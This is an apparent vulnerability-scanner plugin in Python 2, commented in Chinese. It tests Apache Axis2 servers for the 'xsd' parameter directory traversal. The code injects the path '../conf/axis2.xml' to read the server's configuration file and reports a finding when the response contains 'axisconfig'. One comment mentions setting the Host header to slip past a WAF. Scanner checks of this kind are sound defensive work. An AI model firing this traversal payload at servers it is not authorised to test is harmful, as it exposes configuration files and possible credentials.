#!/usr/bin/python
# -*- coding: utf-8 -*-
# 自定义的注入参数构造方法，可以不用导入自行构造注入参数
from engine.engine_utils.inj_functions import query_inject
# 引入插件公用方法（必须）
from engine.engine_utils.common import *

from urlparse import urlparse
# 导入日志对象
from engine.logger import scanLogger as logger


def run_url(http, ob, item):
    '''
    Apache Axis2 'xsd' Parameter Directory Traversal Vulnerability


    引擎调用插件有两种方式，这是其中一种run_url，所以函数名不能修改
    :param http: 引擎传入的http对象
    :param ob: 引擎传入的参数，字典类型，常用key如：
    {'domain': 'demo.aisec.cn', 'cookie': None, 'path': '/demo/', 'source_ip': '182.48.105.212', 'scheme': 'http'}
    :param item: 引擎引入的参数，字典类型分两类（只显示常用key）
    1）url请求为get方法：{'url': 'http://demo.aisec.cn/demo/aisec/html_link.php', 'method': 'get', 'params': 'id=2'}
    2）url请求为post方法：{'url': 'http://demo.aisec.cn/demo/aisec/post_link.php', 'method': 'post',
      'params': '[{"type":"text","name":"i\'+\'d","value":"1"},{"type":"text","name":"m\'+\'sg","value":"abc"},'
                '{"type":"submit","name":"B1","value":"??"}]'}
    :return:
    '''

    # 新构造头部，一般主需要构造注入项和Host，其中Host用于绕过waf扫描，此处没有头部注入，所以只定义Host
    header = {
        "Host": ob['domain']
        }
    try:
        path = item['url']
        params = item['params']
        method = item['method']
        timeout = ob.get('webTimeout')
        pattern = r'/axis2/services/'

        result = []
        if not re.search(pattern, path, re.I):
            pass
        elif re.search(r'(.js|.css)', path, re.I):
            pass
        else:
            url_parse = urlparse(path)
            scheme = url_parse.scheme
            source_ip = ob.get('source_ip')
            if source_ip:
                domain = source_ip
            else:
                domain = url_parse.netloc
            inj_value = "../conf/axis2.xml"
            if 'xsd' in params:
                # 构造新的注入参数
                new_query = query_inject(params, 'xsd', [inj_value], 'replace')
                for query in new_query:
                    # 构造注入的URL
                    new_url = "%s://%s%s?%s" % (scheme, domain,url_parse.path, query)
                    # 发起http请求，request函数原型： def request(self, url, method="GET", body=None, headers=None, redirections=5,
                    # connection_type=None):
                    res, content = http.request(new_url, 'GET', headers=header)
                    # 判断漏洞存在条件
                    if res.get('status') == '200' and re.search(r'axisconfig', content, re.I):
                        # 以下为结果回传及结果写入数据库
                            detail = u'Axis2任意文件读取漏洞'
                            response = getResponse(res, content, keywords='axisconfig')
                            request = getRequest(new_url, 'GET', headers=header, domain=ob['domain'])
                            result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
        return result

    except Exception, e:
        logger.error("File:axis_config_read_url.py, run_url function :%s" % (str(e)))
        return result

